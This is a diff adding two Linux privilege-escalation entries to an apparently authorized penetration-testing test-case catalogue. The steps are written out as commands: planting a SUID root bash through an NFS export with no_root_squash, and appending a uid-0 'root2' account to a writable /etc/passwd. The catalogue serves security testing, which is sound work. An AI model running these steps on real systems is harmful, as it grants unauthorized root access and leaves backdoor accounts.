@@ -209,3 +209,30 @@
 _All test cases must be executed only within written authorization scope. Unauthorized use is illegal._
 
 _Last updated: 2026-06-04_
+
+---
+
+### TC-PE-009: NFS no_root_squash Privilege Escalation
+
+| Field | Value |
+|------|------|
+| **ID** | TC-PE-009 |
+| **Name** | NFS no_root_squash Privilege Escalation |
+| **Category** | E. Linux Escalation |
+| **Severity** | HIGH |
+| **Prerequisites** | Low-priv shell on host with an NFS mount exported with `no_root_squash` (check `showmount -e TARGET` and `/proc/mounts`) |
+| **Test Steps** | 1. From the attack box: `showmount -e TARGET` to list exports<br>2. Mount: `mount -o rw TARGET:/export /tmp/nfs`<br>3. Copy a root-SUID shell into the export: `cp /bin/bash /tmp/nfs/rootbash && chmod +s /tmp/nfs/rootbash` (as local root on attacker box)<br>4. On the target, execute `/export/rootbash -p`<br>5. Verify `id` shows euid=0 |
+| **Expected Results** | The SUID root binary planted over NFS executes with root privileges, escalating the low-priv shell |
+
+### TC-PE-010: Writable /etc/passwd Root Escalation
+
+| Field | Value |
+|------|------|
+| **ID** | TC-PE-010 |
+| **Name** | Writable /etc/passwd Root Escalation |
+| **Category** | E. Linux Escalation |
+| **Severity** | HIGH |
+| **Prerequisites** | Low-priv shell; `/etc/passwd` writable by current user (`ls -l /etc/passwd`) |
+| **Test Steps** | 1. Generate a password hash: `openssl passwd -6 -saltxyz password123`<br>2. Append a root entry: `echo 'root2:$6$xyz$HASH:0:0::/root:/bin/bash' >> /etc/passwd`<br>3. Switch user: `su root2` with the chosen password<br>4. Alternatively replace root's hash field directly<br>5. Verify `id` = uid 0 |
+| **Expected Results** | Custom uid-0 account logs in successfully, demonstrating root escalation via weak file permissions |
+
